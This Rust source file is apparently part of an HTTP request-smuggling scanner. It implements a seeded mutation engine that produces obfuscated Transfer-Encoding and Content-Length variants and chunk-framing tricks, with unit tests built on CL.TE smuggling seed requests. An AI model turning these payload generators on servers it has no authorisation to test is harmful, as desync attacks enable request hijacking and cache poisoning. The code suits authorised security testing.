use std::collections::HashSet;

/// Configuration for the mutation engine.
#[derive(Debug, Clone)]
pub struct MutatorConfig {
    /// Seed for the xorshift64 PRNG (deterministic output).
    pub seed: u64,
    /// Number of mutations to attempt per seed payload.
    pub mutations_per_payload: usize,
}

impl Default for MutatorConfig {
    fn default() -> Self {
        Self {
            seed: 42,
            mutations_per_payload: 5,
        }
    }
}

/// Lightweight deterministic mutation engine using xorshift64 PRNG.
pub struct Mutator {
    state: u64,
    config: MutatorConfig,
}

impl Mutator {
    pub fn new(config: MutatorConfig) -> Self {
        let state = if config.seed == 0 { 1 } else { config.seed };
        Self { state, config }
    }

    /// xorshift64 PRNG - fast, deterministic, no dependencies.
    fn next_u64(&mut self) -> u64 {
        let mut x = self.state;
        x ^= x << 13;
        x ^= x >> 7;
        x ^= x << 17;
        self.state = x;
        x
    }

    /// Pick a random index in [0, max).
    fn rand_index(&mut self, max: usize) -> usize {
        if max == 0 {
            return 0;
        }
        (self.next_u64() as usize) % max
    }

    /// Take seed payloads and return originals + deduplicated mutants.
    pub fn mutate_payloads(&mut self, seeds: &[String]) -> Vec<String> {
        let expected = seeds.len() * (self.config.mutations_per_payload + 1);
        let mut seen = HashSet::with_capacity(expected);
        let mut result = Vec::with_capacity(expected);

        // Keep all originals (single clone per unique seed)
        for s in seeds {
            if seen.insert(s.clone()) {
                result.push(s.clone());
            }
        }

        // Generate mutants (move into result, clone only for seen check)
        for seed in seeds {
            for _ in 0..self.config.mutations_per_payload {
                let strategy = self.rand_index(9);
                let mutant = match strategy {
                    0 => self.mutate_te_whitespace(seed),
                    1 => self.mutate_te_case(seed),
                    2 => self.mutate_cl_value(seed),
                    3 => self.mutate_line_endings(seed),
                    4 => self.mutate_junk_header(seed),
                    5 => self.mutate_chunk_size(seed),
                    6 => self.mutate_control_char(seed),
                    7 => self.mutate_header_duplication(seed),
                    8 => self.mutate_body_padding(seed),
                    _ => seed.clone(),
                };
                if !seen.contains(&mutant) {
                    seen.insert(mutant.clone());
                    result.push(mutant);
                }
            }
        }

        result
    }

    /// Strategy 1: Inject whitespace (space/tab/VT/FF) at random positions in TE header.
    fn mutate_te_whitespace(&mut self, payload: &str) -> String {
        let ws_chars = [" ", "\t", "\x0B", "\x0C"];
        let ws = ws_chars[self.rand_index(ws_chars.len())];

        // Locate the Transfer-Encoding header name case-insensitively — like the
        // sibling strategies (`mutate_te_case`, `mutate_control_char`, …) — rather
        // than requiring the exact canonical `Transfer-Encoding:` spelling. The
        // old case-sensitive, colon-adjacent match returned the payload unchanged
        // for any obfuscated seed (`TRANSFER-ENCODING:`, `Transfer-Encoding :`,
        // …); that no-op mutant then collided with the original in the dedup set
        // and was dropped, so this strategy produced nothing for a large class of
        // TE payloads. Insert the whitespace right after the header's colon,
        // searching only within the header line so a colon elsewhere can't be hit.
        if let Some(header) = find_header_case_insensitive(payload, "transfer-encoding") {
            let insert_at = header.colon + 1;
            let mut result = String::with_capacity(payload.len() + 2);
            result.push_str(&payload[..insert_at]);
            result.push_str(ws);
            result.push_str(&payload[insert_at..]);
            return result;
        }
        payload.to_string()
    }

    /// Strategy 2: Randomize case of Transfer-Encoding header.
    fn mutate_te_case(&mut self, payload: &str) -> String {
        let te_variants = [
            "transfer-encoding",
            "TRANSFER-ENCODING",
            "Transfer-encoding",
            "tRaNsFeR-eNcOdInG",
            "Transfer-ENCODING",
            "TRANSFER-Encoding",
        ];

        if let Some(header) = find_header_case_insensitive(payload, "transfer-encoding") {
            let variant = te_variants[self.rand_index(te_variants.len())];
            let mut result = payload[..header.name_start].to_string();
            result.push_str(variant);
            result.push_str(&payload[header.name_end..]);
            result
        } else {
            payload.to_string()
        }
    }

    /// Strategy 3: Modify Content-Length value (leading zeros, off-by-one, trailing space).
    fn mutate_cl_value(&mut self, payload: &str) -> String {
        if let Some(header) = find_header_case_insensitive(payload, "content-length") {
            let rest = &payload[header.value_start..header.value_end];
            // Find the numeric value
            let trimmed = rest.trim_start();
            let skip_ws = rest.len() - trimmed.len();
            let num_end = trimmed
                .find(|c: char| !c.is_ascii_digit())
                .unwrap_or(trimmed.len());
            if num_end > 0
                && let Ok(val) = trimmed[..num_end].parse::<i64>()
            {
                let mutation_type = self.rand_index(4);
                let new_val = match mutation_type {
                    0 => format!("0{}", val), // leading zero
                    // Saturating so a seed declaring `Content-Length: i64::MAX`
                    // cannot overflow (a debug panic / release wrap to a negative
                    // length); it simply stays at i64::MAX.
                    1 => format!("{}", val.saturating_add(1)), // off-by-one up
                    2 => format!("{} ", val),                  // trailing space
                    3 => format!(" {}", val),                  // leading space
                    _ => format!("{}", val),
                };
                let value_start = header.value_start + skip_ws;
                let value_end = value_start + num_end;
                let mut result = payload[..value_start].to_string();
                result.push_str(&new_val);
                result.push_str(&payload[value_end..]);
                return result;
            }
        }
        payload.to_string()
    }

    /// Strategy 4: Mutate line endings (CRLF -> LF, CR, double-CRLF).
    fn mutate_line_endings(&mut self, payload: &str) -> String {
        let mutation = self.rand_index(3);
        match mutation {
            0 => payload.replace("\r\n", "\n"),           // CRLF -> LF
            1 => payload.replace("\r\n", "\r"),           // CRLF -> CR only
            2 => payload.replacen("\r\n", "\r\n\r\n", 1), // double first CRLF
            _ => payload.to_string(),
        }
    }

    /// Strategy 5: Inject junk header before/after TE/CL header.
    fn mutate_junk_header(&mut self, payload: &str) -> String {
        let junk_headers = [
            "X-Junk: garbage",
            "X-Padding: aaaa",
            "Foo: bar",
            "X-Ignore: 1",
        ];
        let junk = junk_headers[self.rand_index(junk_headers.len())];

        if let Some(header) = find_header_case_insensitive(payload, "transfer-encoding") {
            let before = self.rand_index(2) == 0;
            if before {
                // Find start of line (previous \n)
                let mut result = payload[..header.line_start].to_string();
                result.push_str(junk);
                result.push_str("\r\n");
                result.push_str(&payload[header.line_start..]);
                result
            } else {
                // Find end of TE line
                let mut result = payload[..header.line_end].to_string();
                result.push_str(junk);
                result.push_str("\r\n");
                result.push_str(&payload[header.line_end..]);
                result
            }
        } else {
            payload.to_string()
        }
    }

    /// Strategy 6: Mutate chunk size format (leading zeros, extensions, whitespace).
    fn mutate_chunk_size(&mut self, payload: &str) -> String {
        let mutation = self.rand_index(3);
        match mutation {
            0 => {
                // Leading zeros on chunk size: "1\r\n" -> "001\r\n"
                replace_first_in_body(payload, b"1\r\nA", "001\r\nA")
            }
            1 => {
                // Chunk extension: "1\r\nA" -> "1;ext=val\r\nA"
                replace_first_in_body(payload, b"1\r\nA", "1;ext=val\r\nA")
            }
            2 => {
                // Whitespace after chunk size: "0\r\n\r\n" -> "0 \r\n\r\n"
                replace_first_in_body(payload, b"0\r\n\r\n", "0 \r\n\r\n")
            }
            _ => payload.to_string(),
        }
    }

    /// Strategy 7: Inject control character in header name/value.
    fn mutate_control_char(&mut self, payload: &str) -> String {
        let ctrl_chars = ["\x00", "\x0B", "\x0C", "\x7F", "\x01"];
        let ctrl = ctrl_chars[self.rand_index(ctrl_chars.len())];

        if let Some(header) = find_header_case_insensitive(payload, "transfer-encoding") {
            let inject_at =
                header.name_start + self.rand_index(header.name_end - header.name_start);
            let mut result = payload[..inject_at].to_string();
            result.push_str(ctrl);
            result.push_str(&payload[inject_at..]);
            result
        } else {
            payload.to_string()
        }
    }

    /// Strategy 8: Duplicate TE or CL header.
    fn mutate_header_duplication(&mut self, payload: &str) -> String {
        let dup_te = self.rand_index(2) == 0;

        if dup_te {
            if let Some(header) = find_header_case_insensitive(payload, "transfer-encoding") {
                let header_line = &payload[header.line_start..header.line_end];
                let mut result = payload[..header.line_end].to_string();
                result.push_str(header_line);
                if !header_line.ends_with('\n') {
                    result.push_str("\r\n");
                }
                result.push_str(&payload[header.line_end..]);
                result
            } else {
                payload.to_string()
            }
        } else if let Some(header) = find_header_case_insensitive(payload, "content-length") {
            let header_line = &payload[header.line_start..header.line_end];
            let mut result = payload[..header.line_end].to_string();
            result.push_str(header_line);
            if !header_line.ends_with('\n') {
                result.push_str("\r\n");
            }
            result.push_str(&payload[header.line_end..]);
            result
        } else {
            payload.to_string()
        }
    }

    /// Strategy 9: Add body padding after chunked terminator.
    fn mutate_body_padding(&mut self, payload: &str) -> String {
        let padding_options = ["X", "SMUGGLED", "\r\n", "GET / HTTP/1.1\r\n"];
        let padding = padding_options[self.rand_index(padding_options.len())];

        if payload.ends_with("0\r\n\r\n") {
            let mut result = payload.to_string();
            result.push_str(padding);
            result
        } else {
            payload.to_string()
        }
    }
}

#[derive(Debug, Clone, Copy)]
struct HeaderMatch {
    line_start: usize,
    line_end: usize,
    name_start: usize,
    name_end: usize,
    colon: usize,
    value_start: usize,
    value_end: usize,
}

fn normalize_header_name(name: &str) -> String {
    fn hex_value(byte: u8) -> Option<u8> {
        match byte {
            b'0'..=b'9' => Some(byte - b'0'),
            b'a'..=b'f' => Some(byte - b'a' + 10),
            b'A'..=b'F' => Some(byte - b'A' + 10),
            _ => None,
        }
    }

    let bytes = name.as_bytes();
    let mut normalized = String::with_capacity(bytes.len());
    let mut index = 0;
    while index < bytes.len() {
        let byte = if bytes[index] == b'%' && index + 2 < bytes.len() {
            if let (Some(high), Some(low)) =
                (hex_value(bytes[index + 1]), hex_value(bytes[index + 2]))
            {
                index += 3;
                (high << 4) | low
            } else {
                index += 1;
                continue;
            }
        } else {
            let byte = bytes[index];
            index += 1;
            byte
        };
        if byte.is_ascii_alphabetic() {
            normalized.push(byte.to_ascii_lowercase() as char);
        }
    }
    normalized
}

/// Find a named header in the header block, never in the request target or body.
/// Header names may have optional horizontal whitespace before the colon, which
/// is useful for mutating the deliberately malformed framing corpus.
fn find_header_case_insensitive(haystack: &str, needle: &str) -> Option<HeaderMatch> {
    let header_end = match (haystack.find("\r\n\r\n"), haystack.find("\n\n")) {
        (Some(crlf), Some(lf)) => crlf.min(lf),
        (Some(crlf), None) => crlf,
        (None, Some(lf)) => lf,
        (None, None) => haystack.len(),
    };
    let normalized_needle = normalize_header_name(needle);
    if normalized_needle.is_empty() {
        return None;
    }
    let haystack_bytes = haystack.as_bytes();

    let mut line_start = 0;
    while line_start < header_end {
        let raw_line_end = haystack_bytes[line_start..header_end]
            .iter()
            .position(|&byte| byte == b'\n')
            .map(|offset| line_start + offset + 1)
            .unwrap_or(header_end);
        let (line_end, content_end) = if raw_line_end == header_end {
            // The header terminator is outside `header_end`; include its first
            // line ending in the match so inserting/duplicating the final
            // header does not create an extra blank line.
            if haystack_bytes[header_end..].starts_with(b"\r\n") {
                (header_end + 2, header_end)
            } else if haystack_bytes[header_end..].starts_with(b"\n") {
                (header_end + 1, header_end)
            } else {
                (header_end, header_end)
            }
        } else {
            (raw_line_end, raw_line_end)
        };
        let content_end = haystack_bytes[line_start..content_end]
            .iter()
            .rposition(|&byte| byte != b'\n' && byte != b'\r')
            .map(|offset| line_start + offset + 1)
            .unwrap_or(line_start);

        let mut name_start = line_start;
        while name_start < content_end && matches!(haystack_bytes[name_start], b' ' | b'\t') {
            name_start += 1;
        }
        let Some(colon_offset) = haystack_bytes[name_start..content_end]
            .iter()
            .position(|&byte| byte == b':')
        else {
            line_start = line_end;
            continue;
        };
        let colon = name_start + colon_offset;
        let mut name_end = colon;
        while name_end > name_start && matches!(haystack_bytes[name_end - 1], b' ' | b'\t') {
            name_end -= 1;
        }
        let normalized_name = normalize_header_name(&haystack[name_start..name_end]);
        let is_single_junk_suffix = normalized_needle == "transferencoding"
            && normalized_name.starts_with("transferencoding")
            && normalized_name.len() == normalized_needle.len() + 1;
        if normalized_name == normalized_needle || is_single_junk_suffix {
            return Some(HeaderMatch {
                line_start,
                line_end,
                name_start,
                name_end,
                colon,
                value_start: colon + 1,
                value_end: content_end,
            });
        }

        line_start = line_end;
    }
    None
}

/// Replace a chunk-framing pattern only after the request header terminator.
/// Searching the whole payload can mutate a custom header value that happens
/// to contain the same bytes instead of the chunk body being targeted.
fn replace_first_in_body(payload: &str, needle: &[u8], replacement: &str) -> String {
    let Some(header_end) = payload.find("\r\n\r\n") else {
        return payload.to_string();
    };
    let body_start = header_end + 4;
    let Some(relative_start) = payload.as_bytes()[body_start..]
        .windows(needle.len())
        .position(|window| window == needle)
    else {
        return payload.to_string();
    };
    let start = body_start + relative_start;
    let end = start + needle.len();
    let mut result = String::with_capacity(payload.len() + replacement.len() - needle.len());
    result.push_str(&payload[..start]);
    result.push_str(replacement);
    result.push_str(&payload[end..]);
    result
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn mutate_cl_value_does_not_overflow_on_i64_max() {
        // A seed declaring `Content-Length: i64::MAX` must not panic (debug
        // overflow-checks) or wrap to a negative length when the off-by-one
        // mutation fires. Drive mutate_cl_value across many PRNG states so the
        // `val + 1` branch is exercised; previously this panicked on i64::MAX.
        let seed = format!(
            "POST / HTTP/1.1\r\nHost: h\r\nContent-Length: {}\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\n",
            i64::MAX
        );
        let mut m = Mutator::new(MutatorConfig {
            seed: 1,
            mutations_per_payload: 1,
        });
        for _ in 0..64 {
            let mutated = m.mutate_cl_value(&seed);
            assert!(
                !mutated.contains("Content-Length: -"),
                "off-by-one mutation must not produce a negative Content-Length"
            );
        }
    }

    #[test]
    fn mutate_te_whitespace_handles_obfuscated_te_headers() {
        let mut m = Mutator::new(MutatorConfig {
            seed: 7,
            mutations_per_payload: 1,
        });
        // A non-canonical TE header (uppercase, and a space before the colon)
        // must still get whitespace injected after its colon. The old
        // case-sensitive `find("Transfer-Encoding:")` returned it unchanged.
        for (seed, marker) in [
            (
                "POST / HTTP/1.1\r\nHost: h\r\nTRANSFER-ENCODING: chunked\r\n\r\n0\r\n\r\n",
                "TRANSFER-ENCODING:",
            ),
            (
                "POST / HTTP/1.1\r\nHost: h\r\nTransfer-Encoding : chunked\r\n\r\n0\r\n\r\n",
                "Transfer-Encoding :",
            ),
            (
                "POST / HTTP/1.1\r\nHost: h\r\nTransfer_Encoding: chunked\r\n\r\n0\r\n\r\n",
                "Transfer_Encoding:",
            ),
        ] {
            let mutated = m.mutate_te_whitespace(seed);
            assert_ne!(
                mutated, seed,
                "obfuscated TE header `{marker}` must be mutated, not returned unchanged"
            );
            // Exactly one whitespace byte was injected.
            assert_eq!(mutated.len(), seed.len() + 1);
        }
    }

    #[test]
    fn mutation_targets_headers_instead_of_request_target() {
        let seed = "POST /Transfer-Encoding:marker HTTP/1.1\r\nHost: h\r\nTransfer-Encoding: chunked\r\nContent-Length: 6\r\n\r\n0\r\n\r\nG";
        let mut m = Mutator::new(MutatorConfig {
            seed: 7,
            mutations_per_payload: 1,
        });
        let mutated = m.mutate_te_whitespace(seed);
        assert!(mutated.starts_with("POST /Transfer-Encoding:marker HTTP/1.1\r\n"));
        assert!(mutated.contains("Transfer-Encoding:"));
        assert_eq!(mutated.len(), seed.len() + 1);
        assert!(!mutated.contains("Transfer-Encoding: chunked\r\n"));
    }

    #[test]
    fn mutate_cl_value_accepts_space_before_colon() {
        let seed = "POST / HTTP/1.1\r\nHost: h\r\nTransfer-Encoding: chunked\r\nContent-Length : 6\r\n\r\n0\r\n\r\nG";
        let mut m = Mutator::new(MutatorConfig {
            seed: 1,
            mutations_per_payload: 1,
        });
        let mutated = m.mutate_cl_value(seed);
        assert_ne!(mutated, seed);
        assert!(mutated.contains("Content-Length : "));
    }

    #[test]
    fn chunk_mutation_targets_the_body_not_a_header_value() {
        let seed = "POST / HTTP/1.1\r\nHost: h\r\nX-Note: 1\r\nA\r\nTransfer-Encoding: chunked\r\n\r\n1\r\nA\r\n0\r\n\r\n";
        let mut m = Mutator::new(MutatorConfig {
            seed: 1,
            mutations_per_payload: 1,
        });
        let mutated = m.mutate_chunk_size(seed);
        assert_ne!(mutated, seed);
        assert!(mutated.contains("X-Note: 1\r\nA\r\n"));
        assert!(mutated[mutated.find("\r\n\r\n").unwrap() + 4..].contains("A\r\n"));
    }

    #[test]
    fn test_deterministic_output() {
        let seeds = vec![
            "POST / HTTP/1.1\r\nHost: example.com\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG".to_string(),
        ];

        let mut m1 = Mutator::new(MutatorConfig {
            seed: 42,
            mutations_per_payload: 5,
        });
        let mut m2 = Mutator::new(MutatorConfig {
            seed: 42,
            mutations_per_payload: 5,
        });

        let r1 = m1.mutate_payloads(&seeds);
        let r2 = m2.mutate_payloads(&seeds);
        assert_eq!(r1, r2);
    }

    #[test]
    fn test_different_seeds_different_results() {
        let seeds = vec![
            "POST / HTTP/1.1\r\nHost: example.com\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG".to_string(),
        ];

        let mut m1 = Mutator::new(MutatorConfig {
            seed: 42,
            mutations_per_payload: 5,
        });
        let mut m2 = Mutator::new(MutatorConfig {
            seed: 999,
            mutations_per_payload: 5,
        });

        let r1 = m1.mutate_payloads(&seeds);
        let r2 = m2.mutate_payloads(&seeds);
        // Both contain the original, but mutants should differ
        assert_ne!(r1, r2);
    }

    #[test]
    fn test_deduplication() {
        let seeds = vec![
            "POST / HTTP/1.1\r\nHost: example.com\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG".to_string(),
            "POST / HTTP/1.1\r\nHost: example.com\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG".to_string(),
        ];

        let mut m = Mutator::new(MutatorConfig {
            seed: 42,
            mutations_per_payload: 3,
        });
        let result = m.mutate_payloads(&seeds);

        // Check no duplicates
        let unique: HashSet<_> = result.iter().collect();
        assert_eq!(result.len(), unique.len());
    }

    #[test]
    fn test_originals_preserved() {
        let seeds = vec![
            "POST / HTTP/1.1\r\nHost: example.com\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG".to_string(),
        ];

        let mut m = Mutator::new(MutatorConfig {
            seed: 42,
            mutations_per_payload: 3,
        });
        let result = m.mutate_payloads(&seeds);

        // First entry should be the original
        assert_eq!(result[0], seeds[0]);
    }

    #[test]
    fn test_mutants_contain_http() {
        let seeds = vec![
            "POST / HTTP/1.1\r\nHost: example.com\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG".to_string(),
        ];

        let mut m = Mutator::new(MutatorConfig {
            seed: 42,
            mutations_per_payload: 10,
        });
        let result = m.mutate_payloads(&seeds);

        for payload in &result {
            assert!(
                payload.contains("HTTP/1.1") || payload.contains("HTTP/"),
                "Mutant missing HTTP version: {}",
                &payload[..std::cmp::min(100, payload.len())]
            );
        }
    }

    #[test]
    fn test_more_results_than_seeds() {
        let seeds = vec![
            "POST / HTTP/1.1\r\nHost: example.com\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG".to_string(),
        ];

        let mut m = Mutator::new(MutatorConfig {
            seed: 42,
            mutations_per_payload: 5,
        });
        let result = m.mutate_payloads(&seeds);
        assert!(result.len() > seeds.len());
    }

    #[test]
    fn test_xorshift_deterministic() {
        let mut m1 = Mutator::new(MutatorConfig {
            seed: 123,
            mutations_per_payload: 1,
        });
        let mut m2 = Mutator::new(MutatorConfig {
            seed: 123,
            mutations_per_payload: 1,
        });
        for _ in 0..100 {
            assert_eq!(m1.next_u64(), m2.next_u64());
        }
    }

    #[test]
    fn test_empty_seeds() {
        let seeds: Vec<String> = vec![];
        let mut m = Mutator::new(MutatorConfig::default());
        let result = m.mutate_payloads(&seeds);
        assert!(result.is_empty());
    }
}
